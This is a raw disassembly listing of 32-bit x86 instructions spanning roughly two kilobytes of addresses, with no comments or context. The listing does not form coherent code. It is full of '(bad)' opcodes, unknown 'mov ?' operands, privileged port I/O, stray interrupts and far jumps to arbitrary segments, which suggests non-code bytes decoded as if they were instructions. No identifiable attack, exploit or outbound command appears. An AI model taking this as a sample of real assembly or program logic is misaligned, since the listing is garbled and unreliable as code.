  40b8b4:	jne    0x40b888
  40b8b6:	dec    esp
  40b8b7:	gs popa 
  40b8b9:	inc    esp
  40b8ba:	xor    DWORD PTR [edx+0x3],esi
  40b8bd:	imul   esp,DWORD PTR [esi+0x78],0xffffffb0
  40b8c1:	adc    al,0xa5
  40b8c3:	and    bh,bh
  40b8c5:	int    0x9f
  40b8c7:	or     al,0x9e
  40b8c9:	pop    eax
  40b8ca:	mov    al,ds:0x875d37bc
  40b8cf:	jb     0x40b8a6
  40b8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8d2:	popf   
  40b8d3:	cmp    bl,al
  40b8d5:	sub    bl,0xba
  40b8d8:	pop    esp
  40b8d9:	pop    ebp
  40b8da:	loop   0x40b89d
  40b8dc:	adc    ebx,ebx
  40b8de:	add    BYTE PTR [esi+0x3327faa7],dl
  40b8e4:	adc    eax,0x9582ed60
  40b8e9:	test   eax,0x4458ee
  40b8ee:	imul   ebx,ebx,0x18
  40b8f1:	mov    esi,0x9a8662c4
  40b8f6:	in     eax,0xbc
  40b8f8:	cmp    dl,BYTE PTR [edx-0x44efb9a6]
  40b8fe:	popa   
  40b8ff:	ror    ecx,0x30
  40b902:	jl     0x40b8ac
  40b904:	ds xor dh,ah
  40b907:	aam    0x8e
  40b909:	pop    ds
  40b90a:	(bad)  
  40b90b:	fistp  QWORD PTR [edx+0x1]
  40b90e:	adc    al,0x8a
  40b910:	rcl    BYTE PTR [esi+0xb],0xed
  40b914:	sbb    BYTE PTR [esi+0x35ac40f3],al
  40b91a:	clc    
  40b91b:	inc    eax
  40b91c:	cmp    BYTE PTR [edi-0x4462dedc],0x12
  40b923:	xchg   edi,eax
  40b924:	cmp    al,0x23
  40b926:	pop    DWORD PTR [edx]
  40b928:	sbb    ebp,DWORD PTR [ebp+ecx*8-0x3b]
  40b92c:	dec    eax
  40b92d:	add    ah,BYTE PTR [esp+ecx*8-0x1b]
  40b931:	fwait
  40b932:	ret    
  40b933:	(bad)  
  40b934:	test   eax,0xb6ef978c
  40b939:	cmp    eax,0xcfd120bd
  40b93e:	xchg   ebp,eax
  40b93f:	mov    ecx,esp
  40b941:	push   ebp
  40b942:	push   ds
  40b943:	adc    BYTE PTR [eax],dl
  40b945:	add    eax,0xe2d43bb9
  40b94a:	scas   al,BYTE PTR es:[edi]
  40b94b:	push   ebx
  40b94c:	int    0xc6
  40b94e:	pop    esp
  40b94f:	push   edx
  40b951:	addr16 repnz add eax,0x10e162ae
  40b958:	jmp    0xd82e3e77
  40b95d:	or     BYTE PTR [edx],ch
  40b95f:	ficomp DWORD PTR [esp+edx*1-0x74b2671a]
  40b966:	jno    0x40b8ea
  40b968:	mov    esp,0x36ad691b
  40b96d:	push   ss
  40b96e:	in     eax,dx
  40b96f:	cmp    dh,cl
  40b971:	cs mov ch,0xdb
  40b974:	jmp    DWORD PTR [ecx+0x5d]
  40b977:	ins    BYTE PTR es:[edi],dx
  40b978:	(bad)  
  40b97a:	iret   
  40b97b:	pop    edi
  40b97c:	jg     0x40b930
  40b97e:	std    
  40b97f:	cmp    DWORD PTR [eax-0x42106083],edx
  40b985:	push   esi
  40b986:	pop    esp
  40b987:	fst    QWORD PTR [ecx+esi*2+0x4a]
  40b98b:	test   eax,0x406b604a
  40b990:	jmp    0x867183e6
  40b995:	test   al,0x2f
  40b997:	sti    
  40b998:	add    DWORD PTR [esi+0x1bcb692d],edi
  40b99e:	or     bh,BYTE PTR [eax]
  40b9a0:	loope  0x40b954
  40b9a2:	xor    BYTE PTR [edi],bh
  40b9a4:	out    dx,al
  40b9a5:	ret    0x8aad
  40b9a8:	(bad)  
  40b9aa:	sub    eax,0x41aab8bd
  40b9af:	push   esi
  40b9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b1:	xor    al,0xa7
  40b9b3:	ret    0xef0d
  40b9b6:	out    0x59,eax
  40b9b8:	retf   
  40b9b9:	sbb    al,0x69
  40b9bb:	jl     0x40b9d4
  40b9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9be:	aam    0x46
  40b9c0:	mov    ecx,0x8423a2de
  40b9c5:	adc    dh,BYTE PTR [esi-0x3e5d567e]
  40b9cb:	pop    esp
  40b9cc:	push   ebx
  40b9cd:	retf   0x6169
  40b9d0:	xchg   edi,eax
  40b9d1:	add    BYTE PTR [eax],ch
  40b9d3:	mul    ch
  40b9d5:	neg    BYTE PTR [ebx+ebx*1+0x7bef8a24]
  40b9dc:	lods   al,BYTE PTR ds:[esi]
  40b9dd:	jl     0x40b9dd
  40b9df:	pop    ebx
  40b9e0:	jbe    0x40ba0d
  40b9e2:	xor    eax,0xbbe9bc2
  40b9e7:	dec    ebx
  40b9e8:	lahf   
  40b9e9:	xlat   BYTE PTR ds:[ebx]
  40b9ea:	dec    ebx
  40b9eb:	cmp    al,0xdc
  40b9ed:	push   esi
  40b9ee:	fldcw  WORD PTR [eax]
  40b9f0:	sub    al,0x42
  40b9f2:	lea    eax,[edi]
  40b9f4:	aam    0xb0
  40b9f6:	in     eax,0x26
  40b9f8:	pusha  
  40b9f9:	push   ss
  40b9fa:	xchg   dh,cl
  40b9fc:	std    
  40b9fd:	imul   esi,DWORD PTR [edi],0xa0e90c8a
  40ba03:	das    
  40ba04:	rcr    ch,1
  40ba06:	int3   
  40ba07:	popf   
  40ba08:	fisubr WORD PTR [eax+0x7b]
  40ba0b:	cld    
  40ba0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba0d:	call   0x55e8:0xf1ed6068
  40ba14:	adc    DWORD PTR [edi-0x3a],esp
  40ba17:	mov    ebp,0x4d939d51
  40ba1c:	fistp  QWORD PTR [ecx]
  40ba1e:	loop   0x40b9ad
  40ba20:	lea    ebx,[edx]
  40ba22:	mov    ?,WORD PTR [edx-0x80]
  40ba25:	jo     0x40b9cf
  40ba27:	mov    bl,bh
  40ba29:	out    0x8a,al
  40ba2b:	(bad)  
  40ba2c:	in     eax,0x79
  40ba2e:	jp     0x40ba17
  40ba30:	out    dx,eax
  40ba31:	pop    ss
  40ba32:	adc    al,0xd9
  40ba34:	shl    BYTE PTR [edx],cl
  40ba36:	fbstp  TBYTE PTR [esp+eax*4]
  40ba39:	(bad)  
  40ba3a:	out    0x69,eax
  40ba3c:	mov    edx,0xc68637dd
  40ba41:	clc    
  40ba42:	pop    esi
  40ba43:	cmp    eax,0x91f5e1be
  40ba48:	out    dx,eax
  40ba49:	iret   
  40ba4a:	mov    cl,0x4c
  40ba4c:	inc    ecx
  40ba4d:	popa   
  40ba4e:	repz int3 
  40ba50:	push   edi
  40ba51:	pop    edi
  40ba52:	or     al,0x4d
  40ba54:	pop    ds
  40ba55:	enter  0x480b,0x57
  40ba59:	ins    DWORD PTR es:[edi],dx
  40ba5a:	addr16 mov gs:0xe2be,eax
  40ba5f:	test   DWORD PTR [ebx-0x7a],esp
  40ba62:	jo     0x40b9e9
  40ba64:	test   DWORD PTR [edx+0x4d],ecx
  40ba67:	ins    DWORD PTR es:[edi],dx
  40ba68:	adc    BYTE PTR [edx-0x28bc0ab5],ah
  40ba6e:	cld    
  40ba6f:	ret    0xc49d
  40ba72:	mov    ds,edi
  40ba74:	nop
  40ba75:	xchg   esp,eax
  40ba76:	or     al,0xb8
  40ba78:	mov    eax,0xe336b64a
  40ba7d:	aam    0xc8
  40ba7f:	xchg   ebp,eax
  40ba80:	dec    ebp
  40ba81:	fist   WORD PTR [esi+0x601991ed]
  40ba87:	lods   eax,DWORD PTR ds:[esi]
  40ba88:	shl    BYTE PTR [ecx-0x7e],cl
  40ba8b:	cmp    al,0x6b
  40ba8d:	daa    
  40ba8e:	loope  0x40ba48
  40ba90:	xor    BYTE PTR [esi+0x6ccc2803],dl
  40ba96:	sbb    DWORD PTR [eax-0x109b1eeb],ebx
  40ba9c:	xchg   esi,eax
  40ba9d:	popa   
  40ba9e:	iret   
  40ba9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa0:	pop    ecx
  40baa1:	lock jmp 0xfa3c9782
  40baa7:	adc    ecx,DWORD PTR [edx]
  40baa9:	adc    dh,BYTE PTR [ebx-0x29a60e9e]
  40baaf:	fcom   DWORD PTR [esi+ebx*4+0x6a2b5bb2]
  40bab6:	ret    
  40bab7:	out    dx,al
  40bab8:	cmp    edx,DWORD PTR [esi+0x7b4aafb3]
  40babe:	test   al,0xae
  40bac0:	add    bh,BYTE PTR [eax+0x17]
  40bac3:	lds    edx,FWORD PTR cs:[eax+edx*1+0x6235aedd]
  40bacb:	and    dl,BYTE PTR [esi]
  40bacd:	fnsave [ebp+0x39]
  40bad0:	or     BYTE PTR [esi-0x58],bh
  40bad3:	mov    ebx,0xca2f1277
  40bad8:	xchg   edx,eax
  40bad9:	popf   
  40bada:	in     al,dx
  40badb:	jp     0x40bb36
  40badd:	pushf  
  40bade:	push   cs
  40badf:	fs add al,0xa5
  40bae2:	pop    esi
  40bae3:	in     al,dx
  40bae4:	inc    eax
  40bae5:	cmp    DWORD PTR [edx+ecx*1+0x4d],eax
  40bae9:	push   cs
  40baea:	int3   
  40baeb:	shl    DWORD PTR [eax+ebp*4-0x70c719b3],1
  40baf2:	or     eax,0x24272afc
  40baf7:	add    al,0xab
  40baf9:	test   DWORD PTR ds:0x19bfe6c3,ebp
  40baff:	push   edi
  40bb00:	int3   
  40bb01:	xchg   ebx,eax
  40bb02:	pop    es
  40bb03:	pop    es
  40bb04:	push   ebx
  40bb05:	push   ecx
  40bb06:	test   al,0xb7
  40bb08:	push   0xffffff97
  40bb0a:	sbb    al,0xe6
  40bb0c:	push   esi
  40bb0d:	push   edi
  40bb0e:	xchg   ebp,eax
  40bb0f:	xor    al,0xca
  40bb11:	add    al,0x89
  40bb13:	adc    edi,DWORD PTR [ebp+0x6b]
  40bb16:	in     al,dx
  40bb17:	lods   eax,DWORD PTR ds:[esi]
  40bb18:	imul   ebx,DWORD PTR [edi+0x515c8bb6],0xffffffe4
  40bb1f:	xor    BYTE PTR [ebx-0x49],ch
  40bb22:	into   
  40bb23:	push   edx
  40bb24:	mov    bl,0xb3
  40bb26:	sub    eax,0xff51c0c1
  40bb2b:	es pop esp
  40bb2d:	jo     0x40bb71
  40bb2f:	push   cs
  40bb30:	sub    ecx,ebp
  40bb32:	inc    eax
  40bb33:	sti    
  40bb34:	cs es cmp eax,0x3c264df2
  40bb3b:	fist   WORD PTR [ecx]
  40bb3d:	cmp    BYTE PTR [ecx-0x194a5d16],bl
  40bb43:	leave  
  40bb44:	cld    
  40bb45:	add    DWORD PTR cs:[ecx],esi
  40bb48:	jnp    0x40bb36
  40bb4a:	fs ja  0x40bb32
  40bb4d:	loopne 0x40bb35
  40bb4f:	aas    
  40bb50:	lods   al,BYTE PTR ds:[esi]
  40bb51:	push   edi
  40bb52:	pop    ds
  40bb53:	xchg   BYTE PTR [edx-0x534db0fc],dl
  40bb59:	inc    edi
  40bb5a:	retf   0xe389
  40bb5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb5e:	push   es
  40bb5f:	fwait
  40bb60:	add    BYTE PTR [esi+0x19599656],dl
  40bb66:	mov    dh,0x7f
  40bb68:	sbb    ebp,DWORD PTR [esi-0x252807ee]
  40bb6e:	icebp  
  40bb6f:	lock jecxz 0x40bbdb
  40bb72:	push   ebp
  40bb73:	cmp    BYTE PTR [ebx+0x24],ah
  40bb76:	(bad)  
  40bb77:	outs   dx,BYTE PTR ds:[esi]
  40bb78:	loope  0x40bb13
  40bb7a:	cmp    DWORD PTR [ebp+eax*4-0xe],eax
  40bb7e:	dec    ecx
  40bb7f:	dec    edi
  40bb80:	jo     0x40bb64
  40bb82:	bound  edi,QWORD PTR [ebx+0x7f165118]
  40bb88:	call   0xa9d1:0x2ca808d1
  40bb8f:	repz or dh,BYTE PTR [edi-0x7434fa48]
  40bb96:	sub    al,0x6b
  40bb98:	inc    ebx
  40bb99:	in     eax,dx
  40bb9a:	jne    0x40bc04
  40bb9c:	cdq    
  40bb9d:	lods   al,BYTE PTR ds:[esi]
  40bb9e:	stc    
  40bb9f:	pop    es
  40bba0:	xchg   edi,eax
  40bba1:	jno    0x40bb70
  40bba3:	adc    al,0x58
  40bba5:	lds    edx,FWORD PTR es:[edi-0x44e96945]
  40bbac:	pop    edi
  40bbad:	lods   al,BYTE PTR ds:[esi]
  40bbae:	stos   BYTE PTR es:[edi],al
  40bbaf:	push   0x4f
  40bbb1:	fsub   st(4),st
  40bbb3:	mov    bl,0x24
  40bbb5:	lock les esi,FWORD PTR [esp+ecx*8-0x1b6d234a]
  40bbbd:	mov    bl,0x66
  40bbbf:	mov    dl,0x13
  40bbc1:	or     al,0x6e
  40bbc3:	xor    al,cl
  40bbc5:	adc    eax,0x404d4391
  40bbca:	mov    cl,0xd1
  40bbcc:	xchg   ecx,eax
  40bbcd:	dec    esi
  40bbce:	pop    ebp
  40bbcf:	mov    eax,0xb5bd712
  40bbd4:	test   eax,0xee645df6
  40bbd9:	enter  0x706b,0xd1
  40bbdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbde:	loope  0x40bc53
  40bbe0:	dec    edi
  40bbe1:	mov    ah,0xee
  40bbe3:	mov    ebx,0xc1313088
  40bbe8:	add    ebp,DWORD PTR [ebp+ebp*2+0xd]
  40bbec:	jmp    0x22f:0xb3bd505b
  40bbf3:	adc    BYTE PTR [edx],0xfa
  40bbf6:	xchg   edi,eax
  40bbf7:	test   ebp,0xe6730ca8
  40bbfd:	std    
  40bbfe:	out    0x83,al
  40bc00:	mov    eax,0x75dd2099
  40bc05:	call   FWORD PTR [esi*2-0x25d8d133]
  40bc0c:	iret   
  40bc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc0e:	mov    ecx,0x48921c30
  40bc13:	adc    eax,0xf3722388
  40bc18:	sbb    ch,BYTE PTR [esi+0x6d]
  40bc1b:	or     WORD PTR [eax+edx*8+0x66],ax
  40bc20:	dec    ebp
  40bc21:	fdivrp st(5),st
  40bc23:	rcr    bh,0xb8
  40bc26:	gs adc dh,dl
  40bc29:	cmp    al,0x83
  40bc2b:	mov    ?,esp
  40bc2d:	xlat   BYTE PTR ds:[ebx]
  40bc2e:	mov    ds:0x777660a4,eax
  40bc33:	jbe    0x40bc99
  40bc35:	mov    edx,0x48d02b74
  40bc3a:	pop    eax
  40bc3b:	jo     0x40bc53
  40bc3d:	pushf  
  40bc3e:	retf   0x2b0e
  40bc41:	mov    ecx,0xc20f8e2e
  40bc46:	mov    ecx,0x599f5a6e
  40bc4b:	mov    ebp,ebx
  40bc4d:	inc    esi
  40bc4e:	push   0x3
  40bc50:	jnp    0x40bca5
  40bc52:	lods   eax,DWORD PTR ds:[esi]
  40bc53:	mov    ch,0xf5
  40bc55:	stos   DWORD PTR es:[edi],eax
  40bc56:	xchg   DWORD PTR [esi],ebx
  40bc58:	lock stos DWORD PTR es:[edi],eax
  40bc5a:	nop
  40bc5b:	stos   BYTE PTR es:[edi],al
  40bc5c:	inc    ebx
  40bc5d:	mov    ch,0x33
  40bc5f:	xchg   ecx,eax
  40bc60:	sti    
  40bc61:	dec    eax
  40bc62:	out    0x87,al
  40bc64:	js     0x40bc59
  40bc66:	out    dx,eax
  40bc67:	sub    BYTE PTR [edi+0x65fb84e6],dh
  40bc6d:	jo     0x40bced
  40bc6f:	xchg   esi,eax
  40bc70:	inc    edi
  40bc71:	scas   eax,DWORD PTR es:[edi]
  40bc72:	xor    cl,BYTE PTR [edx+0x57c12069]
  40bc78:	mov    ?,eax
  40bc7a:	push   0xffffff87
  40bc7c:	xchg   edi,eax
  40bc7d:	ins    DWORD PTR es:[edi],dx
  40bc7e:	push   esp
  40bc7f:	xchg   esi,eax
  40bc80:	or     ecx,DWORD PTR [esi+edx*1]
  40bc83:	cmp    al,0xd8
  40bc85:	ret    
  40bc86:	ins    BYTE PTR es:[edi],dx
  40bc87:	cs sub eax,0x9c86745c
  40bc8d:	pop    ebx
  40bc8e:	mov    edi,0x2a6ff51e
  40bc93:	mov    ecx,0xf943c31
  40bc98:	mov    ch,0xe
  40bc9a:	jmp    0x40bc21
  40bc9c:	clc    
  40bc9d:	or     BYTE PTR [edx-0x15a2765d],dl
  40bca3:	call   0xb81b:0x2606ed72
  40bcaa:	dec    ebp
  40bcab:	jmp    0xcb8f:0x776bc1d0
  40bcb2:	jmp    0xc93a:0x2a3ec147
  40bcb9:	daa    
  40bcba:	int3   
  40bcbb:	ror    BYTE PTR [ecx+eax*8-0x30],cl
  40bcbf:	or     esi,DWORD PTR [edx+0x784e408b]
  40bcc5:	and    BYTE PTR [edx+0x41],al
  40bcc8:	dec    ebx
  40bcc9:	push   ds
  40bcca:	je     0x40bcab
  40bccc:	js     0x40bcb8
  40bcce:	out    dx,al
  40bccf:	nop
  40bcd0:	inc    edi
  40bcd1:	dec    edx
  40bcd2:	fs jl  0x40bcf8
  40bcd5:	rol    DWORD PTR [edi-0x34],1
  40bcd8:	pop    ebx
  40bcd9:	sub    BYTE PTR [eax+0x42],0x6a
  40bcdd:	das    
  40bcde:	fisub  WORD PTR [edi+0x5679a9d4]
  40bce4:	aas    
  40bce5:	xor    DWORD PTR ds:0x28355fe9,ecx
  40bceb:	push   edx
  40bcec:	or     al,0x5e
  40bcee:	(bad)  
  40bcef:	shl    BYTE PTR [ebx],1
  40bcf1:	jns    0x40bd58
  40bcf3:	add    BYTE PTR [ecx+0x5c7ca937],dh
  40bcf9:	push   ebx
  40bcfa:	xor    esp,ebx
  40bcfc:	(bad)  
  40bcfd:	jge    0x40bcb6
  40bcff:	test   DWORD PTR [esi],edi
  40bd01:	fcmovne st,st(1)
  40bd03:	sahf   
  40bd04:	aad    0x7d
  40bd06:	push   esi
  40bd07:	std    
  40bd08:	(bad)  
  40bd09:	sub    eax,0x87fbce4f
  40bd0e:	stos   BYTE PTR es:[edi],al
  40bd0f:	mov    bh,0xd7
  40bd11:	loopne 0x40bd1e
  40bd13:	xchg   ecx,eax
  40bd14:	mov    bl,0x38
  40bd16:	sub    ecx,DWORD PTR [ebx]
  40bd18:	pop    DWORD PTR [ebx-0x17]
  40bd1b:	sub    DWORD PTR [ebp-0x31],ecx
  40bd1e:	adc    eax,0x3d9e4f96
  40bd23:	out    dx,eax
  40bd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd25:	pop    esi
  40bd26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd27:	pop    esp
  40bd28:	stos   DWORD PTR es:[edi],eax
  40bd29:	out    dx,eax
  40bd2a:	call   0x449a:0x80dd1867
  40bd31:	adc    eax,DWORD PTR [ebx+0x6]
  40bd34:	push   ecx
  40bd35:	lock sbb esi,ecx
  40bd38:	dec    edx
  40bd39:	mov    eax,0xb342f335
  40bd3e:	jnp    0x40bdbd
  40bd40:	sub    DWORD PTR [edx+eiz*2+0x7cb9b332],0x6ae91890
  40bd4b:	mov    ch,0xb0
  40bd4d:	pop    eax
  40bd4e:	mov    DWORD PTR [edi],eax
  40bd50:	pop    eax
  40bd51:	mov    DWORD PTR [ecx+0xf],edi
  40bd54:	sahf   
  40bd55:	outs   dx,DWORD PTR fs:[esi]
  40bd57:	rol    ah,1
  40bd59:	push   eax
  40bd5a:	fisttp DWORD PTR [ebx+eax*8+0x6b56227]
  40bd61:	mov    ebp,0xfcd7b4b9
  40bd66:	lahf   
  40bd67:	xchg   ecx,eax
  40bd68:	jp     0x40bd96
  40bd6a:	pop    ss
  40bd6b:	fisubr DWORD PTR [eax-0x44db5559]
  40bd71:	shl    bl,cl
  40bd73:	stc    
  40bd74:	add    eax,0x88c4250b
  40bd79:	inc    edi
  40bd7a:	jge    0x40bd6c
  40bd7c:	push   ss
  40bd7d:	repz mov ecx,0xde4cd73b
  40bd83:	cld    
  40bd84:	dec    esp
  40bd86:	add    ebp,esi
  40bd88:	dec    ebx
  40bd89:	int    0x53
  40bd8b:	lods   al,BYTE PTR ds:[esi]
  40bd8c:	mov    dl,0x78
  40bd8e:	xlat   BYTE PTR ds:[ebx]
  40bd8f:	jmp    0xb19784ac
  40bd94:	lahf   
  40bd95:	sub    DWORD PTR ds:0x7ccc6e91,0x28c738a5
  40bd9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bda0:	xadd   BYTE PTR [ebp-0x2b965047],dl
  40bda7:	pop    ss
  40bda8:	iret   
  40bda9:	xor    edx,eax
  40bdab:	jecxz  0x40bd2e
  40bdad:	jo     0x40be14
  40bdaf:	jg     0x40bd99
  40bdb1:	cs jns 0x40bdb3
  40bdb4:	pop    esp
  40bdb5:	repz jb 0x40bdcf
  40bdb8:	imul   BYTE PTR [esi+ebx*2-0x7f]
  40bdbc:	test   BYTE PTR [eax+0x65],ah
  40bdbf:	out    dx,eax
  40bdc0:	(bad)  
  40bdc1:	sbb    cl,BYTE PTR [ecx+0x6a066c04]
  40bdc7:	test   BYTE PTR [esi+0x301a8007],bh
  40bdcd:	sub    bl,BYTE PTR [ebx-0x2a]
  40bdd0:	pop    eax
  40bdd1:	(bad)  
  40bdd2:	push   ebx
  40bdd3:	inc    eax
  40bdd4:	test   ecx,ebx
  40bdd6:	pop    edi
  40bdd7:	mov    eax,ds:0xb4f1448c
  40bddc:	pop    ds
  40bddd:	in     al,0x84
  40bddf:	lock mov al,ds:0x4ae304d4
  40bde5:	ds adc eax,0x80b8ad4
  40bdeb:	scas   eax,DWORD PTR es:[edi]
  40bdec:	shr    BYTE PTR [ebp+edx*1-0x72dca36e],cl
  40bdf3:	in     eax,0x34
  40bdf5:	int3   
  40bdf6:	and    al,0xb0
  40bdf8:	dec    edx
  40bdf9:	push   ebp
  40bdfa:	push   edi
  40bdfb:	(bad)  
  40bdff:	cld    
  40be00:	shr    BYTE PTR [edi-0x26c91065],0x65
  40be07:	fiadd  WORD PTR [ebx+0x11]
  40be0a:	jbe    0x40bdac
  40be0c:	dec    ebp
  40be0d:	dec    esp
  40be0e:	stos   DWORD PTR es:[edi],eax
  40be0f:	dec    ebx
  40be10:	push   edi
  40be11:	mov    ?,ecx
  40be13:	mov    eax,0x96c1ac56
  40be18:	out    dx,eax
  40be19:	cli    
  40be1a:	hlt    
  40be1b:	mov    ebp,0x763bfcbd
  40be20:	shl    DWORD PTR [eax-0x3c5e66ce],cl
  40be26:	lea    ebp,[ebx+eax*4-0x3a]
  40be2a:	fs mov cl,0x7f
  40be2d:	or     eax,0xbf2a5bf1
  40be32:	mov    bl,BYTE PTR [ebx+0x424c3fae]
  40be38:	fnstenv [esi+0x4]
  40be3b:	arpl   WORD PTR [ebx+0x55],sp
  40be3e:	dec    esp
  40be3f:	inc    edx
  40be40:	bnd ret 
  40be42:	scas   al,BYTE PTR es:[edi]
  40be43:	ret    0x4124
  40be46:	cli    
  40be47:	jns    0x40bdfb
  40be49:	xor    al,0x70
  40be4b:	(bad)  
  40be4c:	fild   WORD PTR [eax]
  40be4e:	sub    eax,0x9c723066
  40be53:	add    dl,BYTE PTR [esi]
  40be55:	jle    0x40beb4
  40be57:	je     0x40be75
  40be59:	hlt    
  40be5a:	loopne 0x40be48
  40be5c:	(bad)  
  40be5d:	lock ja 0x40be96
  40be60:	scas   eax,DWORD PTR es:[edi]
  40be61:	cdq    
  40be62:	pop    esp
  40be63:	push   es
  40be64:	mov    dl,0x56
  40be66:	shr    BYTE PTR [esi+ebx*8+0x760f94ca],cl
  40be6d:	mov    BYTE PTR [ecx],ch
  40be6f:	das    
  40be70:	gs xchg ebp,eax
  40be72:	jo     0x40be63
  40be74:	rcl    edi,0x13
  40be77:	imul   edi,DWORD PTR [ebp-0x68b380a2],0x1f
  40be7e:	jp     0x40be72
  40be80:	mov    dl,0xf4
  40be82:	out    dx,al
  40be83:	fnstcw WORD PTR [eax+0x17]
  40be86:	mov    bh,0x69
  40be88:	ds jmp 0xb38b:0x6d87bbd7
  40be90:	pop    edi
  40be91:	push   es
  40be92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be93:	pop    ss
  40be94:	cmp    al,0xf1
  40be96:	out    0x51,eax
  40be98:	xor    al,0x1
  40be9a:	jg     0x40be7b
  40be9c:	shr    BYTE PTR [edx+0x3e],cl
  40be9f:	retf   0xb8e0
  40bea2:	inc    ecx
  40bea3:	push   cs
  40bea4:	jmpw   0xdd53
  40bea8:	or     BYTE PTR [eax-0x119d4cde],al
  40beae:	jo     0x40bf01
  40beb0:	mov    dl,dl
  40beb2:	dec    eax
  40beb3:	ins    DWORD PTR es:[edi],dx
  40beb4:	adc    ax,0x6d5d
  40beb8:	das    
  40beb9:	stos   DWORD PTR es:[edi],eax
  40beba:	(bad)  
  40bebb:	test   BYTE PTR [esi+0x1becdca],0xfd
  40bec2:	lds    ebp,FWORD PTR [esi+0xe137e45]
  40bec8:	and    BYTE PTR [ebx+0x3c74d96a],dh
  40bece:	outs   dx,BYTE PTR ds:[esi]
  40becf:	mov    bh,0x47
  40bed1:	or     al,0x79
  40bed3:	lds    edi,FWORD PTR [eax+0x53]
  40bed6:	and    DWORD PTR [ecx],edx
  40bed8:	fidiv  DWORD PTR ds:0x1cad88b1
  40bede:	sahf   
  40bedf:	pop    ecx
  40bee0:	ins    BYTE PTR es:[edi],dx
  40bee1:	mov    esi,0xc977d64d
  40bee6:	inc    ecx
  40bee7:	jo     0x40bec2
  40bee9:	mov    esi,0x97b88d81
  40beee:	pusha  
  40beef:	fdivr  QWORD PTR [edx+0x71]
  40bef2:	jp     0x40bedc
  40bef4:	jmp    0x40bed9
  40bef6:	fbld   TBYTE PTR [esi+esi*4+0x0]
  40befa:	inc    edx
  40befb:	inc    ebp
  40befc:	fstp   DWORD PTR [edi+ecx*8+0x54f0c4e4]
  40bf03:	std    
  40bf04:	pusha  
  40bf05:	imul   edi,ebx,0xffffffce
  40bf08:	retw   
  40bf0a:	xor    eax,0xb434f0ad
  40bf0f:	sahf   
  40bf10:	pusha  
  40bf11:	jb     0x40bec7
  40bf13:	ins    BYTE PTR es:[edi],dx
  40bf14:	dec    esp
  40bf15:	fld    DWORD PTR [eax]
  40bf17:	shl    ah,0x3f
  40bf1a:	push   edx
  40bf1b:	mov    esp,0x1d0837b
  40bf20:	loopne 0x40befc
  40bf22:	adc    al,0x62
  40bf25:	xchg   esi,eax
  40bf26:	dec    eax
  40bf27:	aaa    
  40bf28:	stc    
  40bf29:	and    DWORD PTR [eax+ecx*1-0x4c6bb24f],ebp
  40bf30:	loope  0x40bf58
  40bf32:	pop    ecx
  40bf33:	xchg   BYTE PTR [ecx],ah
  40bf35:	fstp   DWORD PTR ds:0xc40b7708
  40bf3b:	imul   BYTE PTR [ecx]
  40bf3d:	daa    
  40bf3e:	xchg   ecx,eax
  40bf3f:	xchg   edi,eax
  40bf40:	xchg   DWORD PTR [eax],edx
  40bf42:	into   
  40bf43:	dec    eax
  40bf44:	jmp    0x40bf04
  40bf46:	dec    esp
  40bf47:	dec    ebx
  40bf48:	sub    al,0xf1
  40bf4a:	pop    es
  40bf4b:	mov    bh,0x6c
  40bf4d:	mov    ebp,0xe2fdd807
  40bf52:	mov    al,ds:0xef0101cf
  40bf57:	mov    cl,0x83
  40bf59:	bound  edi,QWORD PTR [edi+0x368a87b8]
  40bf5f:	js     0x40bee7
  40bf61:	mov    WORD PTR [edx+0x8099be4],es
  40bf67:	pop    esp
  40bf68:	adc    dl,BYTE PTR [edx-0x7d]
  40bf6b:	fmul   DWORD PTR [ebp+0xe2e64b3]
  40bf71:	pop    ebx
  40bf72:	cdq    
  40bf73:	pop    ebx
  40bf74:	and    dl,0xbd
  40bf77:	push   esp
  40bf78:	mov    dh,0x2
  40bf7a:	push   esp
  40bf7b:	test   ebp,edi
  40bf7d:	shl    ch,cl
  40bf7f:	add    eax,DWORD PTR [esi-0x10edfe77]
  40bf85:	mov    cl,0x3a
  40bf87:	add    ebp,DWORD PTR [eax+ecx*2]
  40bf8a:	or     DWORD PTR [ecx],ebp
  40bf8c:	mov    al,ds:0x29362764
  40bf91:	stos   BYTE PTR es:[edi],al
  40bf92:	sub    ebx,DWORD PTR [ebp-0x5ba8c0b2]
  40bf98:	and    eax,0xa4a0ec28
  40bf9d:	push   cs
  40bf9e:	fs push ecx
  40bfa0:	je     0x40bf50
  40bfa2:	and    DWORD PTR [ecx-0x59],esi
  40bfa5:	mov    esi,0xb3091d06
  40bfaa:	aad    0x6d
  40bfac:	mov    cl,0x8e
  40bfae:	and    edx,ebp
  40bfb0:	sahf   
  40bfb1:	(bad)  
  40bfb2:	adc    al,0xae
  40bfb4:	jnp    0x40bf9b
  40bfb6:	sahf   
  40bfb7:	add    eax,0x84c077f4
  40bfbc:	rol    BYTE PTR [esi-0x788cc493],0x2e
  40bfc3:	pop    ebp
  40bfc4:	sbb    DWORD PTR [eax-0x77],ebp
  40bfc7:	inc    eax
  40bfc8:	mov    bh,0xf3
  40bfca:	mov    eax,ds:0xe3db04d8
  40bfcf:	xor    DWORD PTR ds:0xc6ed0e8c,edx
  40bfd5:	xor    ecx,DWORD PTR [eax+esi*8-0x23c6876]
  40bfdc:	mov    ?,WORD PTR [esi-0x7c500bc]
  40bfe2:	xchg   di,ax
  40bfe4:	mov    ebp,0xc0bfb171
  40bfe9:	popa   
  40bfea:	push   cs
  40bfeb:	fsubr  st(3),st
  40bfed:	pop    ds
  40bfee:	add    cl,BYTE PTR [ebp-0x68]
  40bff1:	or     ecx,edx
  40bff3:	and    eax,0x2ee53047
  40bff8:	nop
  40bff9:	pop    ebp
  40bffa:	and    al,0xf4
  40bffc:	push   0x2a
  40bffe:	fst    QWORD PTR [eax-0x625672e7]
  40c004:	or     BYTE PTR [edi+0x22],ch
